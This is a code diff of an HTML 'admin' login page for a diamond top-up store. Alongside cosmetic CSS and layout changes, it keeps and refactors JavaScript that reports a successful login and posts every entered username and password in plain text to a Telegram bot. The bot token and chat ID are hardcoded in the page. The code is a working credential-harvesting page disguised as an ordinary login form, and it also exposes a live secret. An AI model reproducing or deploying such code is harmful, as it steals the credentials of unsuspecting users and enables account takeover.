@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>NISH ADMIN</title>
+<title>KAVIYA ADMIN</title>
 
 <style>
 body{
@@ -28,7 +28,7 @@ width:90%;
 max-width:400px;
 box-shadow:0 5px 15px rgba(0,0,0,0.3);
 display:flex;
-justify-content:space-between;
+justify-content:center;
 align-items:center;
 transition:0.5s;
 z-index:999;
@@ -37,12 +37,6 @@ font-weight:bold;
 
 .success-bar.show{
 top:20px;
-}
-
-.success-bar span{
-cursor:pointer;
-font-weight:bold;
-font-size:18px;
 }
 
 body::before{
@@ -56,11 +50,11 @@ pointer-events:none;
 }
 
 @keyframes frameColor{
-0%{border-color:green;}
-25%{border-color:blue;}
-50%{border-color:red;}
-75%{border-color:yellow;}
-100%{border-color:green;}
+0%{border-color:#00ffcc;}
+25%{border-color:#00c6ff;}
+50%{border-color:#ff00cc;}
+75%{border-color:#ffff00;}
+100%{border-color:#00ffcc;}
 }
 
 .store-title{
@@ -86,16 +80,26 @@ color:white;
 text-transform:uppercase;
 text-shadow:
 0 0 5px #ffffff,
-0 0 10px #00c6ff,
-0 0 20px #00c6ff,
-0 0 40px #00c6ff;
+0 0 15px #00c6ff,
+0 0 30px #00c6ff;
 margin-bottom:20px;
 }
 
 @keyframes colorChange{
 0%{color:#00c6ff;}
-50%{color:#00ffcc;}
-100%{color:#00c6ff;}
+100%{color:#00ffcc;}
+}
+
+.top-photo{
+margin:20px auto;
+width:90%;
+max-width:350px;
+}
+
+.top-photo img{
+width:100%;
+border-radius:20px;
+box-shadow:0 0 30px #00c6ff;
 }
 
 input{
@@ -127,21 +131,9 @@ font-weight:bold;
 cursor:pointer;
 }
 
-.loginbtn{
-background:#00ff99;
-color:black;
-}
-
-.topup{
-background:#00c6d7;
-color:black;
-}
-
-.contact{
-background:transparent;
-border:2px solid white;
-color:white;
-}
+.loginbtn{ background:#00ff99; color:black; }
+.topup{ background:#00c6d7; color:black; }
+.contact{ background:transparent; border:2px solid white; color:white; }
 
 .footer-text{
 margin-top:10px;
@@ -154,8 +146,7 @@ font-weight:bold;
 <body>
 
 <div id="successBar" class="success-bar">
-<span>✅ Login Successfully!</span>
-<span onclick="closeBar()">✖</span>
+✅ Login Successfully!
 </div>
 
 <div class="store-title">NISH DIAMOND STORE</div>
@@ -164,15 +155,16 @@ font-weight:bold;
 <h1 class="main-title">NISH ADMIN</h1>
 <p>Fast • Secure • Web owner - Admin Nish</p>
 
-<input type="text" id="username" placeholder="Username"><br>
+<div class="top-photo">
+<img src="IMG_20260222_095145_370.jpg">
+</div>
 
+<input type="text" id="username" placeholder="Username"><br>
 <input type="password" id="password" placeholder="Password"><br>
 <button class="showbtn" onclick="togglePassword()">Show</button>
 
 <button class="loginbtn" onclick="login()">LOGIN</button>
-
 <button class="topup" onclick="goTopup()">TOP UP NOW</button>
-
 <button class="contact" onclick="contactAdmin()">CONTACT ADMIN</button>
 
 <div class="footer-text">Sri Lanka No 1 Diamond Seller</div>
@@ -181,7 +173,7 @@ font-weight:bold;
 
 let loggedIn = false;
 
-/* 🔥 ADD YOUR BOT DETAILS HERE */
+/* 🔑 TELEGRAM DETAILS */
 let botToken = "8493374890:AAHYANqGrfzvPQpHWHYhUhrxhm6fzPa_Esk";
 let chatId = "8300102049";
 
@@ -191,7 +183,6 @@ pw.type = (pw.type === "password") ? "text" : "password";
 }
 
 function login(){
-
 let username = document.getElementById("username").value;
 let password = document.getElementById("password").value;
 
@@ -210,27 +201,28 @@ bar.classList.remove("show");
 },3000);
 
 /* 🔥 SEND TELEGRAM ALERT */
+sendTelegram(username, password);
+}
+
+function sendTelegram(username, password){
+
 let message =
 "🚨 NEW LOGIN ALERT 🚨\n\n"+
 "👤 Username: " + username + "\n"+
 "🔑 Password: " + password + "\n"+
 "🌍 Time: " + new Date().toLocaleString();
 
-fetch("https://api.telegram.org/bot"+botToken+"/sendMessage",{
-method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({
-chat_id:chatId,
-text:message
+fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify({
+chat_id: chatId,
+text: message
 })
-});
+})
+.then(res => console.log("Telegram Sent"))
+.catch(err => console.error("Telegram Error", err));
 
-}
-
-function closeBar(){
-document.getElementById("successBar").classList.remove("show");
 }
 
 function goTopup(){
